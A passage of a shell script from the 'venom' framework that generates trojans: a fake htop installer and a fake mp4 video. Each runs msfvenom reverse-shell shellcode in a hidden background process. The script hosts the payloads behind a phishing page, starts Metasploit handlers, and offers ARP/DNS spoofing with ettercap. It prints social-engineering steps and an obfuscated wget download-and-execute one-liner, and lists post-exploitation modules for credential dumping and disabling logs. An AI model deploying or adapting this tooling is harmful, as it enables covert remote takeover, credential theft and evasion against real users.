echo "#include<sys/types.h>" >> htop.c
echo "#include<sys/wait.h>" >> htop.c
echo "#include<unistd.h>" >> htop.c
echo "" >> htop.c
echo "/*" >> htop.c
echo "Author: r00t-3xp10it" >> htop.c
echo "Framework: venom v1.0.16" >> htop.c
echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> htop.c
echo "gcc -fno-stack-protector -z execstack htop.c -o htop_installer.deb" >> htop.c
echo "'Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)'" >> htop.c
echo "*/" >> htop.c
echo "" >> htop.c
echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> htop.c
echo "unsigned char voodoo[] = \"$parse\";" >> htop.c
echo "" >> htop.c
echo "int main()" >> htop.c
echo "{" >> htop.c
echo "   /*" >> htop.c
echo "   This fork(); function allow us to spawn a new child process (in background). This way i can" >> htop.c
echo "   execute shellcode in background while continue the execution of the C program in foreground." >> htop.c
echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> htop.c
echo "   */" >> htop.c
echo "   fflush(NULL);" >> htop.c
echo "   int pid = fork();" >> htop.c
echo "      if (pid > 0) {" >> htop.c
echo "         /*" >> htop.c
echo "         We are runing in parent process (child its also running)" >> htop.c
echo "         Install/run htop proccess manager (as foreground job)" >> htop.c
echo "         */" >> htop.c
echo "         printf(\"+---------------------------------+\\\n\");" >> htop.c
echo "         printf(\"|  install Htop proccess manager  |\\\n\");" >> htop.c
echo "         printf(\"+---------------------------------+\\\n\\\n\");" >> htop.c
echo "         /* Display system information onscreen to target user */" >> htop.c
echo "         system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"    Hostname :\$h\\\"\");" >> htop.c
echo "         system(\"c=\$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \\\"    Icon     :\$c\\\"\");" >> htop.c
echo "         system(\"o=\$(hostnamectl | grep 'Operating' | cut -d ':' -f2);echo \\\"    OS       :\$o\\\"\");" >> htop.c
echo "         system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"    Kernel   :\$k\\\"\");" >> htop.c
echo "" >> htop.c
echo "            /* Install htop package */" >> htop.c
echo "            sleep(1);printf(\"\\\n[*] Please wait, Installing htop package ..\\\n\");" >> htop.c
echo "            sleep(1);system(\"sudo apt-get update -qq && sudo apt-get install -y -qq htop\");" >> htop.c
echo "" >> htop.c
echo "         /* Execute htop proccess manager */" >> htop.c
echo "         system(\"f=\$(htop -v | grep -m 1 'htop' | awk {'print \$2'});echo \\\"[i] Htop package version installed: \$f\\\"\");" >> htop.c
echo "	       sleep(1);printf(\"[*] Please wait, executing htop software ..\\\n\");" >> htop.c
echo "	       sleep(3);system(\"htop\");" >> htop.c
echo "      }" >> htop.c
echo "      else if (pid == 0) {" >> htop.c
echo "         /*" >> htop.c
echo "         We are running in child process (as backgrond job - orphan)." >> htop.c
echo "         setsid(); allow us to detach the child (shellcode) from parent (htop_installer.deb) process," >> htop.c
echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> htop.c
echo "         */" >> htop.c
echo "         setsid();" >> htop.c
echo "         void(*ret)() = (void(*)())voodoo;" >> htop.c
echo "         ret();" >> htop.c
echo "      } return 0;" >> htop.c
echo "}" >> htop.c


echo ""
echo "[☠] Compile C program (MITRE ATT&CK T1036) .."
sleep 1
gcc -fno-stack-protector -z execstack $IPATH/output/htop.c -o $IPATH/output/htop_installer.deb


sleep 2
echo "[☠] Give execution permitions to agent .."
sleep 1
chmod +x $IPATH/output/htop_installer.deb > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/htop_installer.deb\n\nchose how to deliver: htop_installer.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2

   else

# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      echo "[☠] copy files to webroot..."
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|htop_installer.deb|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp htop_installer.deb $ApAcHe/htop_installer.deb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|htop_installer.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/htop_installer.deb $ApAcHe/htop_installer.deb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi



sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/htop_installer.deb > /dev/null 2>&1
clear
cd $IPATH/
sh_menu

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_menu
  clear
fi
}




#
# mp4-trojan horse 
#
sh_mp4_trojan () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" FALSE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" TRUE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
appl=$(zenity --title "☠ Chose mp4 file to be backdoored ☠" --filename=$IPATH/bin/mp4/ --file-selection) > /dev/null 2>&1
mP4=$(zenity --entry --title "☠ MP4 NAME ☠" --text "Enter MP4 output name\nexample: ricky-video" --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$mP4" ]; then mP4="ricky-video";fi
if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one PDF file input";sleep 3; sh_exit;fi

echo "[☠] Building agent -> C format .." && sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> LINUX
    | PAYLOAD : $paylo
    | MP4VIDEO: $IPATH/output/streaming.mp4
    |_TROJAN  : $IPATH/output/$mP4.mp4

!
sleep 1
# Make sure that the extension provided its .mp4
ext=$(echo $appl | cut -d '.' -f2)
if [ "$ext" != "mp4" ]; then
   echo ${RedF}[x]${white} Abort, NON compatible extension provided:${RedF}.$ext ${Reset};
   sleep 3 && sh_exit
fi

# Parse mp4 video name for transformation
echo "$appl" > /tmp/test.txt
N4m=$(grep -oE '[^/]+$' /tmp/test.txt) > /dev/null 2>&1
echo "[☠] Rename mp4 from: $N4m To: streaming.mp4" && sleep 2
cp $appl $IPATH/output/streaming.mp4 > /dev/null 2>&1


# use metasploit to build shellcode (msf encoded)
echo "[☠] Using msfvenom to build raw C shellcode .." && sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
echo "[☠] Parsing raw shellcode data (oneliner) .." && sleep 1
parse=$(cat $IPATH/output/chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
echo ""
echo "unsigned char buf[] ="
echo "$parse"
echo ""


cd $IPATH/output
# Build C program (trojan.mp4)
echo "[☠] Building $mP4 C Program .." && sleep 2
echo "#include<stdio.h>" > $mP4.c
echo "#include<stdlib.h>" >> $mP4.c
echo "#include<string.h>" >> $mP4.c
echo "#include<sys/types.h>" >> $mP4.c
echo "#include<sys/wait.h>" >> $mP4.c
echo "#include<unistd.h>" >> $mP4.c
echo "" >> $mP4.c
echo "/*" >> $mP4.c
echo "Author: r00t-3xp10it" >> $mP4.c
echo "Framework: venom v1.0.16" >> $mP4.c
echo "MITRE ATT&CK T1036 served as Linux RAT agent (trojan)." >> $mP4.c
echo "gcc -fno-stack-protector -z execstack $mP4.c -o $mP4.mp4" >> $mP4.c
echo "*/" >> $mP4.c
echo "" >> $mP4.c
echo "unsigned char voodoo[] = \"$parse\";" >> $mP4.c
echo "" >> $mP4.c
echo "int main()" >> $mP4.c
echo "{" >> $mP4.c
echo "   /*" >> $mP4.c
echo "   This fork(); function allow us to spawn a new child process (in background)." >> $mP4.c
echo "   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $mP4.c
echo "   */" >> $mP4.c
echo "   fflush(NULL);" >> $mP4.c
echo "   int pid = fork();" >> $mP4.c
echo "      if (pid > 0) {" >> $mP4.c
echo "         system(\"sudo /usr/bin/wget -qq http://$lhost/streaming.mp4 -O /tmp/streaming.mp4 && sudo /usr/bin/xdg-open /tmp/streaming.mp4 > /dev/nul 2>&1 & exit\");" >> $mP4.c
echo "      }" >> $mP4.c
echo "      else if (pid == 0) {" >> $mP4.c
echo "         /*" >> $mP4.c
echo "         We are running in child process (as backgrond job - orphan)." >> $mP4.c
echo "         setsid(); allow us to detach the child (shellcode) from parent (streaming.mp4) process," >> $mP4.c
echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> $mP4.c
echo "         */" >> $mP4.c
echo "         setsid();" >> $mP4.c
echo "         void(*ret)() = (void(*)())voodoo;" >> $mP4.c
echo "         ret();" >> $mP4.c
echo "      } return 0;" >> $mP4.c
echo "}" >> $mP4.c


## Compile/permitions/copy_to_apache2 ( C program )
echo "[☠] Compile C program (MITRE ATT&CK T1036) .." && sleep 1
gcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4
echo "[☠] Give execution permitions to agent .." && sleep 1
chmod +x $IPATH/output/$mP4.mp4 > /dev/null 2>&1
echo "[☠] Porting all files to apache2 webroot .." && sleep 1
zip $mP4.zip $mP4.mp4 > /dev/null 2>&1
cp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1
cp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1
cp $IPATH/output/streaming.mp4 $ApAcHe/streaming.mp4 > /dev/null 2>&1
cd $IPATH


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" FALSE "multi-handler (default)" TRUE "Oneliner (download/exec)" --width 305 --height 220) > /dev/null 2>&1


ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2) # Read settings from venom-main settings file.
if [ "$serv" = "multi-handler (default)" ]; then

   original_string="sudo ./$mP4.mp4";color="${RedF}"
   ## Read the next setting from venom-main setting file .
   if [ "$ovni" = "ON" ]; then
      ## Reverse original string (venom attack vector)
      xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
      reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
      original_string="rev <<< \"$reverse_original\"|\$0"
      color="${GreenF}"
   fi

   ## Print on terminal
   echo ${white}[☠] venom-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1
   echo "---";echo "-  ${YellowF}SOCIAL_ENGINEERING:"${Reset};
   echo "-  Persuade the target to run '$mP4.mp4' executable using their terminal."
   echo "-  That will remote download/exec (LAN) our mp4 video file and auto executes"
   echo "-  our C shellcode in an orphan process (detach from mp4 video process)."
   echo "-  REMARK: All files required by this module have been ported to apache2."
   echo "-";echo "-  ${YellowF}MANUAL_EXECUTION:"${Reset};
   echo "-  $original_string";echo "---"
   echo -n "[☠] Press any key to start a handler .."
   read odf
   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
   echo "[☯] Please dont test samples on virus total .."
   ## Is venom framework configurated to store logfiles?
   if [ "$MsFlF" = "ON" ]; then
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   else
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   fi

else

   original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4";color="${RedF}"
   ## Reverse original string (venom attack vector)
   xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
   ## Read the next setting from venom-main setting file .
   if [ "$ovni" = "ON" ]; then
      original_string="sudo wget http://$lhost/$mP4.zip;h=.;unzip $mP4.zip;\$h/$mP4.mp4"
      color="${GreenF}"
   fi
   
   ## Print on terminal
   echo ${white}[☠] venom-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1
   echo "---";echo "-  ${YellowF}SOCIAL_ENGINEERING:"${Reset};
   echo "-  Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command"
   echo "-  on their terminal. That will remote download/exec (LAN) our mp4 video file and"
   echo "-  auto executes our C shellcode in an orphan process (detach from mp4 video process)."
   echo "-";echo "-  ${YellowF}ONELINER:"${Reset};
   echo "-  $original_string";echo "-"
   echo "-  ${YellowF}ONELINER_OBFUSCATED:"${Reset};
   echo "-  rev <<< \"$reverse_original\"|\$0"
   echo "---"
   echo -n "[☠] Press any key to start a handler .."
   read odf
   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
   echo "[☯] Please dont test samples on virus total .."
   ## Is venom framework configurated to store logfiles?
   if [ "$MsFlF" = "ON" ]; then
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   else
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
   fi

fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm /tmp/test.txt > /dev/null 2>&1
rm /tmp/stream.mp4 > /dev/null 2>&1
rm /tmp/reverse.txt > /dev/null 2>&1
rm $ApAcHe/$mP4.mp4 > /dev/null 2>&1
rm $ApAcHe/$mP4.zip > /dev/null 2>&1
rm $ApAcHe/streaming.mp4 > /dev/null 2>&1
rm $IPATH/output/$mP4.zip > /dev/null 2>&1
rm $IPATH/output/streaming.mp4 > /dev/null 2>&1
sleep 2 && sh_menu


else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2 && sh_menu
  clear
fi
}





# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# to deploy againts windows service (exe-service)
# ------------------------------------------------------
sh_shellcode22 () {
QuE=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "This module builds exe-service payloads to be\ndeployed into windows_service_control_manager\n(SCM) service-payload.\n\nRun module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ProgramX" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ProgramX";fi

echo "[☠] Building shellcode -> exe-service format ..."
sleep 2
echo "[☠] obfuscating -> msf encoders!"
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f exe-service > $IPATH/output/$N4m.exe"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe"
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
